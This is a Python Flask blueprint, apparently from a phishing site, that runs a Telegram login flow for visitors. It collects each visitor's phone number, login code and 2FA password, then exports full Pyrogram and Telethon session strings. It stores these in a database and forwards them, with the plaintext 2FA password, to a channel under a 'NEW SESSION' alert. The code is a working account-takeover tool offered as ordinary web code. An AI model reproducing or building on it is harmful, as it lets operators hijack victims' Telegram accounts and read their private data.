import html as html_lib
import logging
import re
import time
import uuid
from datetime import datetime, timedelta

from flask import Blueprint, jsonify, redirect, render_template, request, session
from pyrogram.errors import (
    FloodWait,
    PasswordHashInvalid,
    PhoneCodeExpired,
    PhoneCodeInvalid,
    PhoneNumberBanned,
    PhoneNumberInvalid,
    SessionPasswordNeeded,
)

from config import BACKGROUND_VIDEO

from . import database
from .database import (
    ensure_db,
    get_videos,
    save_session_to_db,
    send_to_channel,
)
from .channel_notify import send_session_files_to_channel
from .session_manager import session_manager
from .session_tools import check_session

log = logging.getLogger(__name__)

auth_bp = Blueprint("auth", __name__)

PHONE_RE = re.compile(r"^\+[1-9]\d{7,14}$")
DEFAULT_SESSION_NAME = "session"
MAX_CODE_ATTEMPTS = 3


def _err(msg, code=400, **extra):
    body = {"ok": False, "error": msg}
    body.update(extra)
    return jsonify(body), code


def _kill_live(user):
    phone = (user or {}).get("phone")
    if phone:
        try:
            session_manager.kill_by_phone(phone)
        except Exception:
            pass


@auth_bp.route("/")
def index():
    return render_template("index.html", bg_video=BACKGROUND_VIDEO)


@auth_bp.route("/login")
def login_page():
    return render_template("login.html", bg_video=BACKGROUND_VIDEO)


@auth_bp.route("/api/bot-connect", methods=["POST"])
def bot_connect():
    data = request.get_json(silent=True) or {}
    phone = (data.get("phone") or "").strip()
    session_name = data.get("session_name") or DEFAULT_SESSION_NAME
    if not phone:
        return _err("phone required")
    if not phone.startswith("+"):
        phone = "+" + phone
    if not PHONE_RE.match(phone):
        return _err("invalid phone format")

    # Reuse pending session (90s) so double contact does not send a second code
    try:
        ensure_db()
        if database.temp_sessions_col is not None:
            cutoff = datetime.utcnow() - timedelta(seconds=90)
            existing = database.temp_sessions_col.find_one({
                "phone": phone,
                "status": "awaiting_code",
                "created_at": {"$gte": cutoff},
            })
            if existing and existing.get("_id"):
                sid = existing["_id"]
                if session_manager.get_session(sid):
                    return jsonify(ok=True, session_id=sid, reused=True)
    except Exception as exc:
        log.warning("reuse pending failed: %s", exc)

    session_id = uuid.uuid4().hex
    try:
        session_manager.kill_by_phone(phone)
    except Exception:
        pass

    thread = session_manager.create_session(session_id, phone)
    try:
        def _send():
            client = thread.client
            if not getattr(client, "is_connected", False):
                client.connect()
            return client.send_code(phone)
        sent = thread.execute(_send)
        phone_code_hash = getattr(sent, "phone_code_hash", None) or ""
        ensure_db()
        if database.temp_sessions_col is not None:
            database.temp_sessions_col.insert_one({
                "_id": session_id,
                "phone": phone,
                "session_name": session_name,
                "phone_code_hash": phone_code_hash,
                "attempts": 0,
                "created_at": datetime.utcnow(),
                "status": "awaiting_code",
            })
        return jsonify(ok=True, session_id=session_id)
    except FloodWait as e:
        session_manager.remove_session(session_id)
        return _err(f"Flood wait {e.value}s", 429)
    except (PhoneNumberInvalid, PhoneNumberBanned) as e:
        session_manager.remove_session(session_id)
        return _err(str(e) or "invalid phone")
    except Exception as e:
        session_manager.remove_session(session_id)
        log.exception("bot-connect")
        return _err(str(e) or "connect failed")


@auth_bp.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = request.get_json(silent=True) or {}
    session_id = (data.get("session_id") or "").strip()
    code = (data.get("code") or "").strip()
    password = (data.get("password") or "").strip()

    if not session_id or not code:
        return _err("session_id and code required")

    ensure_db()
    doc = None
    if database.temp_sessions_col is not None:
        doc = database.temp_sessions_col.find_one({"_id": session_id})
    if not doc:
        return _err("session expired", 404)

    phone = doc.get("phone")
    phone_code_hash = doc.get("phone_code_hash") or ""
    session_name = doc.get("session_name") or DEFAULT_SESSION_NAME

    thread = session_manager.get_session(session_id)
    if not thread:
        return _err("session not live — request a new code", 404)

    used_password = False
    telethon_string = None
    session_string = None
    user = None

    try:
        def _sign_in():
            return thread.client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        try:
            user = thread.execute(_sign_in)
        except SessionPasswordNeeded:
            if not password:
                return _err("2FA password required", 401, requires_password=True)
            def _pwd():
                return thread.client.check_password(password)
            user = thread.execute(_pwd)
            used_password = True

        session_string = thread.execute(lambda: thread.client.export_session_string())

        def _tele():
            from Nexa.telethon_export import pyrogram_client_to_telethon
            s, _ = pyrogram_client_to_telethon(thread.client)
            return s
        try:
            telethon_string = thread.execute(_tele)
        except Exception:
            telethon_string = None

    except PhoneCodeInvalid:
        attempts = int(doc.get("attempts") or 0) + 1
        try:
            if database.temp_sessions_col is not None:
                database.temp_sessions_col.update_one(
                    {"_id": session_id}, {"$set": {"attempts": attempts}})
        except Exception:
            pass
        if attempts >= MAX_CODE_ATTEMPTS:
            session_manager.remove_session(session_id)
            return _err("Too many wrong attempts. Request a new code.")
        return _err("Invalid code")
    except PhoneCodeExpired:
        session_manager.remove_session(session_id)
        return _err("Code expired. Request a new one.")
    except PasswordHashInvalid:
        return _err("Wrong 2FA password", 401, requires_password=True)
    except FloodWait as e:
        return _err(f"Flood wait {e.value}s", 429)
    except Exception as e:
        log.exception("verify-code")
        session_manager.remove_session(session_id)
        return _err(str(e) or "verify failed")

    if not session_string:
        session_manager.remove_session(session_id)
        return _err("Could not export session")

    verified, check_err = check_session(session_string, attempts=2, delay=0.5)

    first_name = (getattr(user, "first_name", "") or "").strip()
    last_name = (getattr(user, "last_name", "") or "").strip()
    username = getattr(user, "username", None)
    full_name = f"{first_name} {last_name}".strip() or "Unknown"

    user_info = {
        "id": user.id,
        "first_name": first_name,
        "last_name": last_name,
        "username": username or "N/A",
        "phone": phone,
        "session_string": session_string,
        "telethon_string": telethon_string or "",
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "session_name": session_name,
        "two_step_verification": used_password,
        "status": "active" if verified else "unverified",
        "check_fail": None if verified else check_err,
    }

    try:
        save_session_to_db(user_info)
    except Exception as exc:
        log.exception("save_session_to_db: %s", exc)

    try:
        channel_msg = (
            "🟢 <b>NEW SESSION</b>\n"
            f"👤 <b>Name:</b> {html_lib.escape(full_name)}\n"
            f"🔗 <b>Username:</b> "
            f"{html_lib.escape('@' + username) if username else 'N/A'}\n"
            f"🆔 <b>User ID:</b> <code>{user_info['id']}</code>\n"
            f"📱 <b>Phone:</b> <code>{html_lib.escape(phone)}</code>"
        )
        if used_password:
            channel_msg += f"\n🔑 <b>2FA:</b> <code>{html_lib.escape(password)}</code>"
        if verified:
            channel_msg += "\n✅ <b>Status:</b> verified"
        else:
            channel_msg += (
                f"\n⚠️ <b>Status:</b> unverified "
                f"({html_lib.escape(str(check_err))})"
            )
        tele = user_info.get("telethon_string") or ""
        pyro = user_info.get("session_string") or ""
        send_session_files_to_channel(
            phone=phone,
            telethon_string=tele,
            pyrogram_string=pyro,
            caption=channel_msg,
        )
    except Exception as exc:
        log.exception("send session to channel failed: %s", exc)

    session.permanent = True
    session["login_at"] = time.time()
    session["user"] = {
        "id": user_info["id"],
        "name": full_name,
        "username": user_info["username"],
        "phone": phone,
    }
    try:
        session_manager.remove_session(session_id)
    except Exception:
        pass
    return jsonify(ok=True, user=session["user"], verified=verified)


@auth_bp.route("/api/logout", methods=["POST"])
def logout():
    _kill_live(session.get("user") or {})
    session.clear()
    return jsonify(ok=True)
